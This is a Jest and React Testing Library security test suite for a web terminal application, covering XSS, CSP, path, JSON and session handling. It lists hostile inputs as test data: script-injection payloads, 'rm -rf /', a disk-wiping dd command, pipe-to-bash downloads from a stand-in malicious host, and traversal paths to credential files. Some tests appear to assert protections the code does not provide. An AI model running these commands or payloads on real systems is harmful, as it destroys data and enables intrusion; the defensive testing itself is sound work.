/**
 * @jest-environment jsdom
 */

import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import React from 'react';

import { Terminal } from '@/components/terminal/Terminal';
import { Sidebar } from '@/components/sidebar/Sidebar';
import { 
  EdgeCaseScenarios,
  TestDataGenerator,
  renderWithEnhancements 
} from './test-utilities';

// Mock dependencies
jest.mock('@/hooks/useTerminal', () => ({
  useTerminal: () => ({
    terminalRef: { current: null },
    terminal: null,
    writeToTerminal: jest.fn(),
    clearTerminal: jest.fn(),
    focusTerminal: jest.fn(),
    fitTerminal: jest.fn(),
    isConnected: true,
    isAtBottom: true,
    hasNewOutput: false,
    scrollToBottom: jest.fn(),
    scrollToTop: jest.fn(),
  }),
}));

jest.mock('@/hooks/useWebSocket', () => ({
  useWebSocket: () => ({
    sendData: jest.fn(),
    resizeTerminal: jest.fn(),
    isConnected: true,
    on: jest.fn(),
    off: jest.fn(),
  }),
}));

jest.mock('@/lib/state/store', () => ({
  useAppStore: () => ({
    sessions: [],
    activeSession: null,
    isLoading: false,
    error: null,
    agents: [],
    memory: { usage: 50, limit: 100 },
    commands: [],
    prompts: [],
    addSession: jest.fn(),
    removeSession: jest.fn(),
    setActiveSession: jest.fn(),
  }),
}));

describe('Security Testing Framework', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    // Reset any global security state
    delete (window as any).__SECURITY_TEST__;
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    test('should sanitize script tags in terminal output', async () => {
      const maliciousOutputs = EdgeCaseScenarios.generateMaliciousInput().xssPayloads;

      const MockTerminalWithOutput = ({ output }: { output: string }) => {
        return (
          <div>
            <Terminal sessionId="test-session" />
            <div data-testid="terminal-output" dangerouslySetInnerHTML={{ __html: output }} />
          </div>
        );
      };

      for (const payload of maliciousOutputs) {
        // Should not execute scripts when rendered
        const { container } = renderWithEnhancements(
          <MockTerminalWithOutput output={payload} />
        );

        const outputElement = container.querySelector('[data-testid="terminal-output"]');
        expect(outputElement).toBeInTheDocument();

        // Check that no scripts were executed
        expect((window as any).__XSS_EXECUTED__).toBeUndefined();
        
        // Check that script tags are not present in the DOM
        const scriptTags = container.querySelectorAll('script');
        expect(scriptTags).toHaveLength(0);
      }
    });

    test('should sanitize user input in session names', () => {
      const maliciousNames = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>window.__XSS_EXECUTED__ = true;</script>',
      ];

      maliciousNames.forEach((name, index) => {
        const sessions = [{ id: `session-${index}`, name, status: 'active' as const }];
        
        const { container } = renderWithEnhancements(
          <Sidebar
            sessions={sessions}
            activeSessionId={`session-${index}`}
            onSessionSelect={jest.fn()}
            onSessionClose={jest.fn()}
            onNewSession={jest.fn()}
          />
        );

        // Session name should be displayed but not execute scripts
        expect(screen.getByText(name)).toBeInTheDocument();
        expect((window as any).__XSS_EXECUTED__).toBeUndefined();

        // No script tags should be in the DOM
        const scriptTags = container.querySelectorAll('script');
        expect(scriptTags).toHaveLength(0);
      });
    });

    test('should prevent XSS through event handlers', async () => {
      const { user } = renderWithEnhancements(
        <div>
          <input 
            type="text" 
            data-testid="user-input"
            onBlur={(e) => {
              // Simulate processing user input
              const value = e.target.value;
              // Should not evaluate as code
              if (value.includes('javascript:')) {
                e.target.value = value.replace(/javascript:/g, '');
              }
            }}
          />
        </div>
      );

      const input = screen.getByTestId('user-input');
      
      await user.type(input, 'javascript:alert("XSS")');
      await user.tab(); // Trigger blur

      expect(input).toHaveValue('alert("XSS")');
      expect((window as any).__XSS_EXECUTED__).toBeUndefined();
    });

    test('should sanitize URLs and prevent javascript: protocol', () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
        'javascript:void(0);alert("XSS")',
      ];

      const LinkComponent = ({ url }: { url: string }) => {
        // Simulate URL sanitization
        const sanitizeUrl = (url: string) => {
          const dangerous = ['javascript:', 'data:', 'vbscript:'];
          for (const protocol of dangerous) {
            if (url.toLowerCase().startsWith(protocol)) {
              return '#';
            }
          }
          return url;
        };

        return <a href={sanitizeUrl(url)} data-testid="test-link">Link</a>;
      };

      maliciousUrls.forEach((url, index) => {
        const { container } = renderWithEnhancements(
          <LinkComponent url={url} />
        );

        const link = container.querySelector('[data-testid="test-link"]') as HTMLAnchorElement;
        expect(link.href).not.toContain('javascript:');
        expect(link.href).not.toContain('data:');
        expect(link.href).not.toContain('vbscript:');
      });
    });
  });

  describe('Content Security Policy (CSP) Compliance', () => {
    test('should not execute inline scripts', () => {
      const InlineScriptComponent = () => (
        <div>
          <div 
            dangerouslySetInnerHTML={{
              __html: '<script>window.__INLINE_EXECUTED__ = true;</script>'
            }}
          />
          <p>Content with blocked inline script</p>
        </div>
      );

      renderWithEnhancements(<InlineScriptComponent />);

      // Inline script should not execute
      expect((window as any).__INLINE_EXECUTED__).toBeUndefined();
      expect(screen.getByText(/content with blocked/i)).toBeInTheDocument();
    });

    test('should handle nonce-based script execution safely', () => {
      const NonceScriptComponent = () => {
        // Simulate CSP nonce handling
        const nonce = 'test-nonce-12345';
        
        return (
          <div>
            <script nonce={nonce}>
              {`window.__NONCE_EXECUTED__ = '${nonce}';`}
            </script>
            <div>Script with nonce should be controlled</div>
          </div>
        );
      };

      renderWithEnhancements(<NonceScriptComponent />);

      // In real CSP environment, only scripts with correct nonce would execute
      expect(screen.getByText(/script with nonce/i)).toBeInTheDocument();
    });

    test('should prevent eval and Function constructor usage', () => {
      const DynamicCodeComponent = () => {
        const [result, setResult] = React.useState<string>('');

        const handleDynamicCode = () => {
          try {
            // These should be blocked by CSP
            eval('window.__EVAL_EXECUTED__ = true;');
            setResult('eval executed');
          } catch (error) {
            setResult('eval blocked');
          }

          try {
            new Function('window.__FUNCTION_EXECUTED__ = true;')();
            setResult(prev => prev + ', function executed');
          } catch (error) {
            setResult(prev => prev + ', function blocked');
          }
        };

        return (
          <div>
            <button onClick={handleDynamicCode}>Test Dynamic Code</button>
            <div data-testid="result">{result}</div>
          </div>
        );
      };

      const { user } = renderWithEnhancements(<DynamicCodeComponent />);

      const button = screen.getByRole('button');
      user.click(button);

      // Dynamic code execution should be blocked
      expect((window as any).__EVAL_EXECUTED__).toBeUndefined();
      expect((window as any).__FUNCTION_EXECUTED__).toBeUndefined();
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('should validate terminal command input', async () => {
      const { user } = renderWithEnhancements(<Terminal sessionId="test-session" />);

      const dangerousCommands = [
        'rm -rf /',
        'sudo dd if=/dev/random of=/dev/sda',
        'curl http://malicious.site/script.sh | bash',
        '$(curl -s http://malicious.site/payload)',
        '`wget -qO- malicious.site/script | sh`',
        '; rm -rf / #',
      ];

      const terminalElement = screen.getByRole('application', { name: /terminal/i });

      for (const command of dangerousCommands) {
        // Commands should be processed but not executed locally
        await user.type(terminalElement, command);
        await user.keyboard('{Enter}');

        // Should not cause any local system effects
        expect(document.title).not.toBe('COMPROMISED');
        expect((window as any).__MALICIOUS_PAYLOAD__).toBeUndefined();
      }
    });

    test('should sanitize file path inputs', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/dev/null',
        '\\\\network\\share\\malicious.exe',
        'file:///etc/passwd',
        'C:\\Windows\\System32\\cmd.exe',
      ];

      const FilePathComponent = ({ path }: { path: string }) => {
        // Simulate path sanitization
        const sanitizePath = (path: string) => {
          // Remove path traversal attempts
          const cleaned = path.replace(/\.\./g, '').replace(/[\\\/]+/g, '/');
          
          // Block system paths
          const blockedPaths = ['/etc/', '/dev/', '/proc/', 'C:\\Windows\\'];
          for (const blocked of blockedPaths) {
            if (cleaned.includes(blocked)) {
              return '/safe/default/path';
            }
          }
          
          return cleaned;
        };

        return <div data-testid="sanitized-path">{sanitizePath(path)}</div>;
      };

      maliciousPaths.forEach((path, index) => {
        const { container } = renderWithEnhancements(
          <FilePathComponent path={path} />
        );

        const pathElement = container.querySelector('[data-testid="sanitized-path"]');
        const sanitizedPath = pathElement?.textContent || '';

        expect(sanitizedPath).not.toContain('../');
        expect(sanitizedPath).not.toContain('..\\');
        expect(sanitizedPath).not.toContain('/etc/');
        expect(sanitizedPath).not.toContain('C:\\Windows\\');
      });
    });

    test('should validate JSON input safely', () => {
      const maliciousJsonInputs = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"toString": "alert(\\"XSS\\")"}',
        '{"valueOf": "function(){alert(\\"XSS\\");}"}',
      ];

      const JsonProcessorComponent = ({ jsonString }: { jsonString: string }) => {
        const [result, setResult] = React.useState<string>('');

        React.useEffect(() => {
          try {
            // Safe JSON parsing without prototype pollution
            const parsed = JSON.parse(jsonString);
            
            // Check for prototype pollution attempts
            if (Object.hasOwnProperty.call(parsed, '__proto__') ||
                Object.hasOwnProperty.call(parsed, 'constructor') ||
                Object.hasOwnProperty.call(parsed, 'prototype')) {
              setResult('Malicious JSON detected and blocked');
            } else {
              setResult(`Safe JSON processed: ${Object.keys(parsed).length} keys`);
            }
          } catch (error) {
            setResult('Invalid JSON');
          }
        }, [jsonString]);

        return <div data-testid="json-result">{result}</div>;
      };

      maliciousJsonInputs.forEach((jsonString, index) => {
        renderWithEnhancements(<JsonProcessorComponent jsonString={jsonString} />);
        
        const result = screen.getByTestId('json-result');
        expect(result.textContent).toContain('blocked');
        
        // Check that prototype pollution didn't occur
        expect(Object.prototype).not.toHaveProperty('admin');
      });
    });
  });

  describe('Session Security', () => {
    test('should handle session hijacking attempts', () => {
      const sessions = TestDataGenerator.generateSessions(5);
      
      const SessionManagerComponent = () => {
        const [activeSessions, setActiveSessions] = React.useState(sessions);
        const [securityEvents, setSecurityEvents] = React.useState<string[]>([]);

        const validateSession = (sessionId: string) => {
          // Simulate session validation
          const session = activeSessions.find(s => s.id === sessionId);
          if (!session) {
            setSecurityEvents(prev => [...prev, `Invalid session access: ${sessionId}`]);
            return false;
          }
          
          // Check for suspicious activity patterns
          const now = Date.now();
          if (session.lastActivity && now - session.lastActivity < 100) {
            setSecurityEvents(prev => [...prev, `Suspicious rapid access: ${sessionId}`]);
            return false;
          }

          return true;
        };

        const accessSession = (sessionId: string) => {
          if (validateSession(sessionId)) {
            setActiveSessions(prev => prev.map(s => 
              s.id === sessionId ? { ...s, lastActivity: Date.now() } : s
            ));
          }
        };

        return (
          <div>
            <Sidebar
              sessions={activeSessions}
              activeSessionId={activeSessions[0]?.id}
              onSessionSelect={accessSession}
              onSessionClose={jest.fn()}
              onNewSession={jest.fn()}
            />
            <div data-testid="security-events">
              {securityEvents.map((event, index) => (
                <div key={index}>{event}</div>
              ))}
            </div>
          </div>
        );
      };

      const { user } = renderWithEnhancements(<SessionManagerComponent />);

      // Attempt to access non-existent session
      const sessionButtons = screen.getAllByRole('button');
      if (sessionButtons.length > 0) {
        // Simulate attempting to access invalid session
        fireEvent.click(sessionButtons[0]);
        fireEvent.click(sessionButtons[0]); // Rapid double-click

        const securityEvents = screen.getByTestId('security-events');
        // Should detect and log suspicious activity
        expect(securityEvents).toBeInTheDocument();
      }
    });

    test('should implement session timeout', async () => {
      const SessionTimeoutComponent = () => {
        const [isSessionActive, setIsSessionActive] = React.useState(true);
        const [lastActivity, setLastActivity] = React.useState(Date.now());

        React.useEffect(() => {
          const checkTimeout = () => {
            const now = Date.now();
            const timeoutDuration = 30000; // 30 seconds for testing
            
            if (now - lastActivity > timeoutDuration) {
              setIsSessionActive(false);
            }
          };

          const interval = setInterval(checkTimeout, 1000);
          return () => clearInterval(interval);
        }, [lastActivity]);

        const renewSession = () => {
          setLastActivity(Date.now());
          setIsSessionActive(true);
        };

        if (!isSessionActive) {
          return (
            <div>
              <div data-testid="session-expired">Session expired</div>
              <button onClick={renewSession}>Renew Session</button>
            </div>
          );
        }

        return (
          <div>
            <div data-testid="session-active">Session active</div>
            <button onClick={renewSession}>Activity</button>
          </div>
        );
      };

      const { user } = renderWithEnhancements(<SessionTimeoutComponent />);

      expect(screen.getByTestId('session-active')).toBeInTheDocument();

      // Fast-forward time to trigger timeout
      jest.useFakeTimers();
      jest.advanceTimersByTime(31000);

      await waitFor(() => {
        expect(screen.getByTestId('session-expired')).toBeInTheDocument();
      });

      // Test session renewal
      const renewButton = screen.getByRole('button', { name: /renew/i });
      await user.click(renewButton);

      expect(screen.getByTestId('session-active')).toBeInTheDocument();

      jest.useRealTimers();
    });
  });

  describe('Data Exfiltration Prevention', () => {
    test('should prevent sensitive data exposure in console logs', () => {
      const originalConsoleLog = console.log;
      const consoleLogs: any[] = [];
      
      console.log = (...args) => {
        consoleLogs.push(args);
      };

      const SensitiveDataComponent = () => {
        const sensitiveData = React.useMemo(() => ({
          password: 'secret123',
          apiKey: 'sk-1234567890abcdef',
          sessionToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
        }), []);

        React.useEffect(() => {
          // Simulate accidentally logging sensitive data
          console.log('User data:', { username: 'test', id: 123 });
          
          // This should be filtered or redacted
          try {
            console.log('Debug info:', sensitiveData);
          } catch (error) {
            // Ideally, sensitive data logging should be prevented
          }
        }, [sensitiveData]);

        return <div>Component with sensitive data</div>;
      };

      renderWithEnhancements(<SensitiveDataComponent />);

      // Check that sensitive patterns are not exposed
      const allLogs = consoleLogs.flat().join(' ');
      expect(allLogs).not.toContain('secret123');
      expect(allLogs).not.toContain('sk-1234567890');
      expect(allLogs).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');

      console.log = originalConsoleLog;
    });

    test('should prevent clipboard access without user permission', async () => {
      const ClipboardComponent = () => {
        const [clipboardContent, setClipboardContent] = React.useState<string>('');

        const readClipboard = async () => {
          try {
            // Should require user permission
            const text = await navigator.clipboard.readText();
            setClipboardContent(text);
          } catch (error) {
            setClipboardContent('Access denied');
          }
        };

        return (
          <div>
            <button onClick={readClipboard}>Read Clipboard</button>
            <div data-testid="clipboard-content">{clipboardContent}</div>
          </div>
        );
      };

      // Mock clipboard API to simulate permission denial
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          readText: jest.fn().mockRejectedValue(new Error('Permission denied')),
          writeText: jest.fn(),
        },
        writable: true,
      });

      const { user } = renderWithEnhancements(<ClipboardComponent />);

      const button = screen.getByRole('button', { name: /read clipboard/i });
      await user.click(button);

      await waitFor(() => {
        expect(screen.getByTestId('clipboard-content')).toHaveTextContent('Access denied');
      });
    });
  });

  describe('Network Security', () => {
    test('should validate WebSocket message origins', () => {
      const WebSocketSecurityComponent = () => {
        const [messages, setMessages] = React.useState<string[]>([]);
        const [securityAlerts, setSecurityAlerts] = React.useState<string[]>([]);

        const handleMessage = (event: MessageEvent) => {
          // Validate message origin
          const allowedOrigins = ['https://localhost:3000', 'wss://localhost:3001'];
          
          if (!allowedOrigins.includes(event.origin) && event.origin !== window.location.origin) {
            setSecurityAlerts(prev => [...prev, `Unauthorized origin: ${event.origin}`]);
            return;
          }

          // Validate message structure
          try {
            const data = JSON.parse(event.data);
            if (typeof data === 'object' && data.type && data.payload) {
              setMessages(prev => [...prev, data.payload]);
            } else {
              setSecurityAlerts(prev => [...prev, 'Invalid message format']);
            }
          } catch (error) {
            setSecurityAlerts(prev => [...prev, 'Invalid JSON message']);
          }
        };

        React.useEffect(() => {
          // Simulate WebSocket message handling
          const mockEvent = new MessageEvent('message', {
            data: JSON.stringify({ type: 'terminal', payload: 'test message' }),
            origin: window.location.origin,
          });

          handleMessage(mockEvent);

          // Simulate malicious message
          const maliciousEvent = new MessageEvent('message', {
            data: '<script>alert("XSS")</script>',
            origin: 'https://malicious.site',
          });

          handleMessage(maliciousEvent);
        }, []);

        return (
          <div>
            <div data-testid="messages">
              {messages.map((msg, index) => <div key={index}>{msg}</div>)}
            </div>
            <div data-testid="security-alerts">
              {securityAlerts.map((alert, index) => <div key={index}>{alert}</div>)}
            </div>
          </div>
        );
      };

      renderWithEnhancements(<WebSocketSecurityComponent />);

      const messages = screen.getByTestId('messages');
      const alerts = screen.getByTestId('security-alerts');

      expect(messages).toHaveTextContent('test message');
      expect(alerts.textContent).toContain('Unauthorized origin');
    });

    test('should implement rate limiting for API calls', async () => {
      const RateLimitedComponent = () => {
        const [requestCount, setRequestCount] = React.useState(0);
        const [isRateLimited, setIsRateLimited] = React.useState(false);

        const makeRequest = () => {
          const now = Date.now();
          const windowStart = now - 60000; // 1 minute window
          
          // Simple rate limiting simulation
          if (requestCount >= 10) {
            setIsRateLimited(true);
            setTimeout(() => setIsRateLimited(false), 60000);
            return;
          }

          setRequestCount(prev => prev + 1);
          
          // Reset count after window
          setTimeout(() => {
            setRequestCount(0);
          }, 60000);
        };

        return (
          <div>
            <button onClick={makeRequest} disabled={isRateLimited}>
              Make Request ({requestCount}/10)
            </button>
            {isRateLimited && (
              <div data-testid="rate-limited">Rate limit exceeded</div>
            )}
          </div>
        );
      };

      const { user } = renderWithEnhancements(<RateLimitedComponent />);

      const button = screen.getByRole('button');

      // Make multiple rapid requests
      for (let i = 0; i < 12; i++) {
        await user.click(button);
      }

      await waitFor(() => {
        expect(screen.getByTestId('rate-limited')).toBeInTheDocument();
      });

      expect(button).toBeDisabled();
    });
  });
});